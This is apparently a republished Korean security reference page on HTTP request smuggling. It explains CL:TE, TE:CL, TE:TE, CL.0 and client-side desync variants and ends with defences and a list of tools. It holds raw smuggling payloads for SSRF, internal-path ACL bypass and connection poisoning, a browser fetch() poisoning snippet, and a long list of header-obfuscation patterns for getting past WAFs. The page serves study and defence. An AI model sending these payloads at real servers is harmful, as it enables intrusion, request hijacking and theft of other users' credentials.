@@ -1,0 +1,357 @@
+<!doctype html>
+<html lang="ko">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>HTTP Request Smuggling — PIXN</title>
+  <meta name="description" content="HTTP Request Smuggling — Vulnerabilities, attack surfaces, and defensive verification notes.">
+  <meta property="og:title" content="HTTP Request Smuggling — PIXN"><meta property="og:description" content="HTTP Request Smuggling — Vulnerabilities, attack surfaces, and defensive verification notes."><meta property="og:image" content="https://whgusals84.github.io/pixn-security/og.png"><meta name="twitter:card" content="summary_large_image">
+  <link rel="icon" href="/favicon.svg" type="image/svg+xml">
+  <link rel="stylesheet" href="/assets/style.css">
+</head>
+<body>
+  <header data-site-header data-active="reference"></header>
+  <main class="page article-page" id="main">
+    <header class="article-heading">
+      <p class="eyebrow"><a href="/reference/">Reference</a> / <a href="/reference/attack/">Web Security</a></p>
+      <h1>HTTP Request Smuggling</h1>
+      <time datetime="2021-01-12">JANUARY 12, 2021</time>
+    </header>
+    <article class="article-body"><h2 id="introduction">Introduction</h2>
+<p>HTTP Request Smuggling은 network hops로 구성된 환경에서 각 구간의 서버, 장비 등에서 HTTP Request를 처리할 때 차이점으로 인해 발생하는 문제입니다. 보편적으로 Content-Length와 Transfer-Encoding을 동시에 전달하여 구간 별로 HTTP Reuqest의 길이를 잘 못 인지하도록 유도합니다.</p>
+<p>길이가 차이가 나는 경우 각 서버가 인지하는 길이가 다르기 때문에 요청의 일부가 잘리게 되고, 이는 다음 요청에서 소켓상으로 붙어서 처리됩니다. 이를 HTTP Request Smuggling이라고 부릅니다. 여기서 LB와 같이 로드 밸런싱을 하는 구조라면, 본인 또는 타 사용자의 요청에 소켓이 물릴 수도 있는데 이러한 경우 HRS에 영향을 받습니다. 비슷한 용어로 Desync Attack으로도 불립니다.</p>
+<p>Exploitaion 부분에도 설명되어 있지만 HRS는 SSRF, Bypass ACL 등 여러가지 보안 문제를 단일 사용자 또는 광범위한 사용자를 대상으로 발생시킬 수 있어 리스크가 높습니다.</p>
+<blockquote>
+<p>HTTP Request Smuggling (Desync Attack)은 영향받는 피해의 대상이 명확하지 않습니다. 서비스의 환경, 공격자의 환경, 기술 등 여러가지 조건에 따라서 공격자의 세션에서만 유효할 수도 있고, 특정 범위의 사용자 대역 또는 서비스에 접근할 수 있는 모든 사용자에게 영향을 끼칠 수도 있습니다. 다만 공격자 세션에서만 유효하다고 하여도 SSRF 등 서버를 대상으로도 한 공격이 가능하기 떄문에 기본적으로 리스크는 높다고 생각합니다.</p>
+</blockquote>
+<h3 id="background">Background</h3>
+<h4 id="content-length">Content-Length</h4>
+<p>Content-Length는 대다수의 웹 요청에서 기본적으로 사용하는 길이에 대한 헤더입니다. HTTP Body의 길이를 Content-Length 헤더에 포함하여 같이 전달합니다.</p>
+<pre><code>POST / HTTP/1.1
+Host: www.hahwul.com
+Content-Length: 4
+
+asdf
+</code></pre>
+<p>만약 실제 Content-Length와 Body의 값의 길이가 다르다면 요청이 잘리거나(CL 헤더가 작은 경우), 기다리다가 Timeout(CL 헤더가 더 큰 경우)이 발생합니다.</p>
+<h4 id="chunked">Chunked</h4>
+<p><code>Transfer-Encoding: chunked</code> 는 스트리밍 등 대용량 파일 전송을 위해 고안된 HTTP 헤더입니다. Connetion 단위로 데이터의 시작과 끝을 한번에 처리하는 일반적인 HTTP Request와 다르게 chunked된 요청은 하나의 데이터가 여러번의 HTTP Request로 구성될 수 있도록 지원합니다. 포맷은 아래와 같습니다.</p>
+<p>HTTP body</p>
+<pre><code>길이\r\n
+값\r\n
+길이\r\n
+값\r\n
+</code></pre>
+<p>위와 같이 2개의 라인을 기준으로 길이와 값으로 표기합니다. 해당 요청은 여려번의 HTTP Reuqest로 전달되어도 하나의 데이터로 보며, 마지막엔 끝맺음을 의미하는 <code>0\r\n</code> 이 있는 경우에 전체 데이터 전송이 완료되었다고 판단하게 됩니다. <code>0\r\n</code>이 도착하지 않는다면 서버는 요청을 계속 기다리게 됩니다. 실제 예시로 보면 아래와 같습니다.</p>
+<pre><code>POST / HTTP/1.1
+Host: www.hahwul.com
+Transfer-Encoding: chunked
+
+3
+ABC
+0
+
+</code></pre>
+<p>위 요청에서 3은 아래에서 사용하는 ABC의 길이, 두번째 줄인 ABC는 값 그리고 마지막에 0은 요청의 마지막을 의미합니다. HTTP 요청을 나눠서 전송하는 경우 이러한 요청이 발생할껍니다.</p>
+<p>Request 1</p>
+<pre><code>POST / HTTP/1.1
+Host: www.hahwul.com
+Transfer-Encoding: chunked
+
+3
+ABC
+
+</code></pre>
+<p>Request 2</p>
+<pre><code>POST / HTTP/1.1
+Host: www.hahwul.com
+Transfer-Encoding: chunked
+
+2
+AB
+0
+
+</code></pre>
+<h3 id="testing-method">Testing Method</h3>
+<p>위 내용까지 글을 읽었다면 Content-Length(CL) 헤더와 Transfer-Encoding(TE) 헤더가 어떻게 동작하는지 알 수 있습니다. 요점은 이 2개의 헤더가 동시에 전달되었을 떄 여러개의 network hops에서 서로 다르게 처리하게 하여 강제로 요청을 잘리게 만드는 방법입니다.</p>
+<p>개인적으로 생각할 때 4개 정도의 플로우로 진행하면, 취약 포인트 발견부터 실제 영향력 검증까지 테스트하기 쉽습니다.</p>
+<table>
+<thead>
+<tr>
+<th>Step</th>
+<th>Actions</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>Smuggling point 찾기(BurpSuite Scanning / smuggler.py / 수동 테스팅)</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Delay 유도하기. CL / TE간의 관계를 이용해서 원본 요청보다 딜레이가 길어지거나 Gateway Timeout 등을 유도</td>
+</tr>
+<tr>
+<td>3</td>
+<td>Delay가 유도된 경우 Smuggling의 가능성이 존재하기 때문에 실제 Size 조절을 통해 요청을 분리하여 테스트&lt;br /&gt;- 보통 상이한 Status code를 가진 페이지 2개를 이용하여 테스팅&lt;br /&gt;- e.g Req1=200OK , Req2=301,400,404,500, etc...&lt;br /&gt;- Smuggling 요청(Req1) 이후에 동일 페이지 요청(Req1)에서 Smuggled 된 Response(Req2)가 처리되면 취약</td>
+</tr>
+<tr>
+<td>4</td>
+<td>Smuggilng을 통해 발생할 수 있는 리스크 테스트 (Exploiting 과정)</td>
+</tr>
+</tbody>
+</table>
+<p>@albinowax(James Kettle)이 정의한 테스팅 메소드에선 시간에 대한 이야기를 중점적으로 하는데, 실제 Smuggling 케이스에서 Timeout이 없는 경우도 있으니 이 점 인지하고 테스트하시는게 좋습니다.</p>
+<h3 id="attack-types">Attack Types</h3>
+<h4 id="clte">CL:TE</h4>
+<p>CL:TE 는 CL과 TE 헤더가 동시에 전송되었을 때 hops에서 앞단의 서버가 CL을 신뢰하고, 백엔드 서버가 TE를 신뢰할 떄 발생하는 케이스입니다. 아래와 같이 웹 요청을 전송하게 되면 CL은 13이기 떄문에 Request 전문을 모두 백엔드로 보내게되고, 백엔드에선 TE를 보고 있는데, <code>0\r\n</code>이 왔기 때문에 요청을 마무리합니다. 그러면 SMUGGLED라는 문자열은 처리되지 않은채 소켓에 남아있게 됩니다.</p>
+<pre><code>POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+SMUGGLED
+
+</code></pre>
+<p>이 요청이 다음의 웹 요청이 들어왔을 떄 아래와 같이 결합됩니다.</p>
+<pre><code>SMUGGLEDPOST /page HTTP/1.1
+Host: vulnerable-website.com
+
+</code></pre>
+<p>이로써 우리는 다음 요청의 전체 Request를 변조하게 될 수 있습니다. 이를 이용해서 Host 헤더를 바꾸거나 웹 페이지를 바꾸는 등의 행위가 가능합니다. Attack 에 대한 내용은 아래 Offensive techniques 부분에서 조금 더 자세히 다루겠습니다.</p>
+<h4 id="tecl">TE:CL</h4>
+<p>CL:TE와는 반대로 헤더가 동시 전송되었을 때 TE:CL은 프론트 서버가 TE를 신뢰, 백엔드는 CL이 신뢰받는 경우입니다. 아래와 같이 웹 요청이 전송되면 앞단 서버는 TE를 신뢰하기 때문에 요청 전문(<code>0\r\n</code> 까지의 데이터)을 백엔드로 전송하게 되고, 백엔드는 CL 헤더를 보기 때문에 3 길이의 값(8\r\n)만 사용하고 나머지는 버려지게 됩니다. 이로인해 SMUGGLED 단어 이후부턴 처리되지 않고 소켓에 남았기 떄문에 다음 요청에서 결합되어 사용됩니다. (방식은 CL:TE와 동일합니다)</p>
+<pre><code>POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 3
+Transfer-Encoding: chunked
+
+8
+SMUGGLED
+0
+
+</code></pre>
+<h4 id="tete">TE:TE</h4>
+<p>TE:TE는 Transfer Encoding을 비정상적인 방법(앞에 탭이나 공백 추가)으로 전송 했을 때 각 서버간의 차이로 인해서 서로 TE를 처리한 방식이 다름을 이용한 케이스입니다. Hops가 많으면 보통 TE:TE로 부르지 않지만, 단순한 경우 TE:TE로 이야기하기도 합니다.</p>
+<p>예를들면 이러한 케이스입니다.</p>
+<pre><code>POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 3
+  Transfer-Encoding: chunked
+Transfer-Encoding: identity
+
+
+8
+SMUGGLED
+0
+
+
+</code></pre>
+<p>A 서버는 공백이 포함된 <code>  Transfer-Encoding: chunked</code> 를 신뢰하여 <code>0\r\n</code> 까지 확인 후 백엔드로 전달합니다. 백엔드에서 <code>Transfer-Encoding: identity</code> 를 정상적인 TE 헤더로 신뢰한 경우 앞선 TE와 뒤의 TE는 서로 다른 처리 방식을 가지기 때문에 이로 인해서 요청이 잘리게 됩니다.</p>
+<h4 id="cl0">CL.0</h4>
+<p>일반적인 Request Smuggling은 Content-Length와 다른 길이를 의미하는 헤더(e.g Transfer-encoding: chunked)와 조합하여 연결된 여러 시스템간의 불일치를 유도하여 스머글링합니다. 다만 때때로 서버 설정에 따라 Content-Length 자체를 무시할 수도 있는데, 이러한 경우 CL.0 Request Smuggling이라고 표현합니다.</p>
+<p>일부 API Endpoint 등에서 Content-Length 헤더를 신뢰하지 않는 경우가 있습니다. 특히 GET만 사용하기 위한 목적의 API의 경우 Body가 예상되는 Req가 아니기 때문에 신뢰하지 않는 경우가 있는데 해당 API로 진입하는 Hops 중 일부 구간에서 Content-Length를 신뢰한다면 Hops간의 헤더 식별의 차이가 발생하여 결과적으로 Smuggling이 발생합니다.</p>
+<p>현실에서는 모든 요청을 그대로 넘겨주는 LB 또는 네트워크 장비와 CL 헤더를 신뢰하지 않는 App 간에서 자주 발생합니다.</p>
+<pre><code>POST /vulnerable-endpoint HTTP/1.1
+Host: vulnerable-website.com
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 34
+
+GET /hopefully404 HTTP/1.1
+Foo: x
+</code></pre>
+<p>특이한 점은 Content-Length 길이가 임의로 조작된 길이가 아니기 때문에 Burp, ZAP, curl 등의 도구에서 직접 호출이 아닌, Javascript 형태로도 구성할 수 있다는 점입니다. 이러한 점은 아래 CSD(Client-Side Desync) Attack에 영향을 줄 수 있습니다.</p>
+<h4 id="csd-attack">CSD Attack</h4>
+<p>CSD(Client-Side Desync) Attack은 브라우저에서 동작 가능한 Desync Attack입니다. 별도로 작성하였으니 자세한 내용은 아래 문서를 참고해주세요.</p>
+<blockquote>
+<p><a href="/reference/attack/client-side-desync-attack/">Cullinan &gt; Client-Side Desync Attack</a></p>
+</blockquote>
+<pre><code class="language-javascript hljs">fetch<span class="hljs-punctuation">(</span><span class="hljs-string">&#39;https://vulnerable-website.com/api/me&#39;</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">{</span>
+    method<span class="hljs-operator">:</span> <span class="hljs-string">&#39;POST&#39;</span><span class="hljs-punctuation">,</span>
+    body<span class="hljs-operator">:</span> <span class="hljs-string">&quot;GET /hopefully404 HTTP/1.1\r\nFoo: x&quot;</span><span class="hljs-punctuation">,</span> 
+    mode<span class="hljs-operator">:</span> <span class="hljs-string">&#39;no-cors&#39;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// ensure connection ID is visible
+</span><span class="hljs-comment"></span>    credentials<span class="hljs-operator">:</span> <span class="hljs-string">&#39;include&#39;</span> <span class="hljs-comment">// poison &#39;with-cookies&#39; pool
+</span><span class="hljs-comment"></span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">.</span>then<span class="hljs-punctuation">(</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span> <span class="hljs-punctuation">=&gt;</span> <span class="hljs-punctuation">{</span>
+    location <span class="hljs-operator">=</span> <span class="hljs-string">&#39;https://vulnerable-website.com/&#39;</span> <span class="hljs-comment">// use the poisoned connection
+</span><span class="hljs-comment"></span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">)</span>
+</code></pre>
+<h2 id="offensive-techniques">Offensive techniques</h2>
+<p>웹 요청을 변조할 수 있기 때문에 여러가지의 Exploiting 방법들이 존재합니다. 활용하기 나름이겠지만 대표적으로 사용하는 방법들 몇가지를 정리해봅니다.</p>
+<h3 id="detect">Detect</h3>
+<p>탐지 방법은 간단합니다. 사이즈가 다른 Content-Length, Transfer-Encoding을 동시에 보내서 Delay를 유도하는 방법으로 쉽게 체크할 수 있습니다.</p>
+<p>TE:CL을 예를들어 보면 이렇습니다.</p>
+<ol>
+<li>아래 요청은 CL은 11, TE는 <code>0\r\n</code> 까지로 잘리는 부분 없이 정상 요청입니다.</li>
+</ol>
+<pre><code>POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 11
+Transfer-Encoding: chunked
+
+1
+A
+0
+
+
+</code></pre>
+<ol start="2">
+<li>아래 요청은 CL은 11로 정상이지만, TE가 <code>0\r\n</code>으로 끝나지 않았기 때문에 백엔드의 Transfer Encoding을 신뢰하는 서버는 connection keep-alive 상태로 <code>0\r\n</code>이 올때까지 대기하게 됩니다. 이로 인해서 delay가 발생하며 이는 취약 서버일 가능성이 높습니다.</li>
+</ol>
+<pre><code>POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 11
+Transfer-Encoding: chunked
+
+1
+A
+T
+
+
+</code></pre>
+<h3 id="exploitation">Exploitation</h3>
+<h4 id="ssrf">SSRF</h4>
+<p>가장 기본적인 방법은 Host 헤더 등을 조작하여 내부로의 접근을 유도하는 방법입니다. 잘려진 요청의 시작점은 내부이기 때문에 Smuggling을 통해 내부시스템 등에 접근할 수 있는 가능성이 있습니다.</p>
+<pre><code>POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 50
+Transfer-Encoding: chunked
+
+0
+GET / HTTP/1.1
+Host: internal-service-host-name
+
+</code></pre>
+<h4 id="bypass-acl">Bypass ACL</h4>
+<p>때때로 IP 기반으로 ACL이 존재하는 경우가 있는데, 이를 우회하는데 사용할 수 있습니다.</p>
+<pre><code>POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 37
+Transfer-Encoding: chunked
+
+0
+GET /api/v2/internal-apis HTTP/1.1
+
+</code></pre>
+<h4 id="poisoning">Poisoning</h4>
+<p>타 사용자에게 영향을 주는 Desync attack의 경우 활용도가 무궁무진합니다. 대표적으로 타 사용자가 로드하는 리소르를 통제할 수 있다는 점인데 이를 통해서 XSS를 유도하거나 인증정보를 탈취하는 등 광범위한 타켓으로 수준 높은 공격이 가능해집니다.</p>
+<ul>
+<li>악성 도메인으로 Redirect (Host 헤더 변조)</li>
+<li>404 유도 (DOS)</li>
+<li>Header 기반 XSS (일반적으로 헤더 기반 XSS는 실제 트리거하기 어렵지만, Desync attack이 있다면 쉬워집니다)</li>
+<li>중요정보 유출(헤더의 뒷 부분이 잘려서 붙기 때문에 Host 헤더 변조 등으로 악성 도메인으로 인증 쿠키나 헤더 등의 정보를 유출이 가능함</li>
+</ul>
+<h3 id="bypass-protection">Bypass protection</h3>
+<h4 id="normalization-attack">Normalization Attack</h4>
+<p>Use IDN Char(%f9). IDN 문자는 서버/앱 별로 처리하는 방식이 다르기 때문에 이를 활용하여 우회할 수 있습니다.</p>
+<pre><code>Transfer-Encoding: chùnked
+</code></pre>
+<h4 id="x00"><code>\x00</code></h4>
+<pre><code>Transfer-Encoding: \x00chunked
+</code></pre>
+<h4 id="bypass-waf">Bypass WAF</h4>
+<pre><code>Foo: bar\r\n\rTransfer-Encoding: chunked
+</code></pre>
+<h4 id="and-many-patterns">And Many patterns</h4>
+<pre><code>%c: 0x1,0x4,0x8,0x9,0xa,0xb,0xc,0xd,0x1F,0x20,0x7f,0xA0,0xFF,0x7F,0x100 등
+
+
+ Transfer-Encoding: chunked
+%cTransfer-Encoding%c: chunked
+%cTransfer-Encoding: chunked
+%cTransfer-Encoding: chunked%c
+%cTransfer-Encoding:%cchunked
+Content-Encoding: chunked
+TRANSFER-ENCODING: CHUNKED
+TrAnSFer-EnCODinG: cHuNkeD
+Transf\x82r-Encoding: chunked
+Transfer Encoding: chunked
+Transfer Encoding:chunked
+Transfer-Encoding : chunked
+Transfer-Encoding%c: chunked
+Transfer-Encoding%c: chunked%c
+Transfer-Encoding%c:%cchunked
+Transfer-Encoding:  chunked
+Transfer-Encoding: 'chunked'
+Transfer-Encoding: \
+Transfer-Encoding: ch\x96nked
+Transfer-Encoding: chunk
+Transfer-Encoding: chunked%c
+Transfer-Encoding: chunked%cX: X
+Transfer-Encoding: chunked%c\nX: X
+Transfer-Encoding: chunked, cow
+Transfer-Encoding: chunked\r
+Transfer-Encoding: chunked\r%cX: X
+Transfer-Encoding: chunked\t
+Transfer-Encoding: cow chunked bar
+Transfer-Encoding: cow, chunked
+Transfer-Encoding: cow\r\nTransfer-Encoding: chunked
+Transfer-Encoding:%cchunked
+Transfer-Encoding:%cchunked%c
+Transfer-Encoding:\n chunked
+Transfer-Encoding:\tchunked
+Transfer-Encoding:\u000Bchunked
+Transfer-Encoding:\xFFchunked
+Transfer-Encoding\t:\tchunked
+Transfer\r-Encoding: chunked
+Transfer_Encoding: chunked
+X: X%cTransfer-Encoding: chunked
+X: X%c\nTransfer-Encoding: chunked
+X: X\r%cTransfer-Encoding: chunked
+X:X\nTransfer-Encoding: chunked
+X:X\rTransfer-Encoding: chunked
+</code></pre>
+<h4 id="hrs-with-chunked-extension">HRS with chunked extension</h4>
+<p><code>Transfer-Encoding: chunked</code>의 extension을 이용하여 TE:TE나 3hops 이상에서의 HTTP Request Smuggling 발생시킬 수 있습니다.</p>
+<pre><code>GET / HTTP/1.1
+Host: localhost:8080
+Transfer-Encoding: chunked
+
+2;\nxx
+4c
+0
+
+GET /admin HTTP/1.1
+Host: localhost:8080
+Transfer-Encoding: chunked
+
+0
+</code></pre>
+<p>자세한 내용은 &quot;<a href="https://www.hahwul.com/2021/10/16/new-technic-of-http-request-smuggling-chunked-extension/">New technic of HTTP Request Smuggling (chunked extension)</a>&quot; 글을 참고해주세요. (추후 컬리넌 페이지에도 자세하게 업데이트하겠습니다.)</p>
+<h2 id="defensive-techniques">Defensive techniques</h2>
+<h3 id="vendor-and-library-단-patch">Vendor and Library 단 Patch</h3>
+<p>가장 간편한 방법의 대응방법입니다. 각 취약점이 존재하는 장비, 서버의 경우 개별적으로 패치를 제공하는 경우가 많은데 이를 이용하여 취약점을 제거할 수 있습니다. 보통 Bypass를 위한 chunked 헤더를 제거하는 형태, CL과 TE 헤더가 동시 전달을 막는 방식으로 적용한 것으로 알고 있습니다.</p>
+<p>이러한 케이스인 경우 CVE를 가지고 있을 가능성이 있기 때문에 취약점이 발생하는 위치를 정확하게 파악한 후 장비, 서버등의 문제라면 패치를 통해 해결할 수 있습니다.</p>
+<h3 id="비정상적인-요청-차단">비정상적인 요청 차단</h3>
+<p>CL, TE가 동시에 존재하는 웹 요청은 정말 일반적이지 않습니다. 서버/어플리케이션 등에서 동시에 오는 경우 처리하지 않도록 한다면 해당 취약점을 막을 수 있습니다. 다만 이 경우에 우회패턴으로 무시할 수 있는 가능성이 있기 떄문에 꼼꼼한 검증이 필요합니다.</p>
+<h3 id="unabled-transfer-encoding">Unabled Transfer-Encoding</h3>
+<p>두번쨰 방법은 TE 헤더를 무시하는 방법입니다. TE 헤더 자체가 일반 서비스에서 무조건 사용하는 헤더는 아니기 때문에 서비스에서 TE 사용이 필요하지 않은 경우 TE 헤더를 백엔드로 전달하지 않는 방향으로 수정이 가능합니다. 다만 이 경우 우회패턴으로 백엔드에 TE를 전달시킬 가능성이 있기 때문에 꼼꼼한 검증이 필요합니다.</p>
+<h3 id="http2-사용">HTTP2 사용</h3>
+<p>HTTP2를 기반으로 통신하는 경우 위 공격에 취약하지 않습니다. 다만 <a href="/reference/attack/h2c_smuggling/">HTTP2 H2C Smuggling</a> 에 영향을 받을 수 있으니 참고가 필요합니다.</p>
+<h2 id="tools">Tools</h2>
+<ul>
+<li>https://github.com/defparam/smuggler</li>
+<li>https://github.com/PortSwigger/http-request-smuggler</li>
+<li>https://github.com/SafeBreach-Labs/HRS</li>
+<li>https://github.com/anshumanpattnaik/http-request-smuggling</li>
+<li>https://github.com/gwen001/pentest-tools/blob/master/smuggler.py</li>
+<li>https://github.com/neex/http2smugl</li>
+<li><a href="https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646">Burp - HTTP Request Smuggler</a></li>
+<li><a href="https://portswigger.net/bappstore/9abaa233088242e8be252cd4ff534988">Burp - TurboIntruder</a></li>
+<li><a href="https://www.zaproxy.org/docs/desktop/ui/dialogs/man_req/">ZAP - Manual Request Editor</a></li>
+<li>https://github.com/assetnote/h2csmuggler</li>
+</ul>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn">https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn</a></li>
+<li><a href="https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/Transfer-Encoding">https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/Transfer-Encoding</a></li>
+<li><a href="https://portswigger.net/web-security/request-smuggling">https://portswigger.net/web-security/request-smuggling</a></li>
+<li><a href="https://www.hahwul.com/2019/08/12/http-smuggling-attack-re-born/">https://www.hahwul.com/2019/08/12/http-smuggling-attack-re-born/</a></li>
+<li><a href="https://www.hahwul.com/2019/10/09/new-technic-of-http-desync-attack/">https://www.hahwul.com/2019/10/09/new-technic-of-http-desync-attack/</a></li>
+</ul></article>
+    <footer class="article-source"><span>Republished with permission</span><a href="https://www.hahwul.com/cullinan/attack/http_smuggling/" rel="noopener noreferrer">Original source ↗</a></footer>
+  </main>
+  <footer data-site-footer></footer><script src="/assets/site.js"></script>
+</body>
+</html>
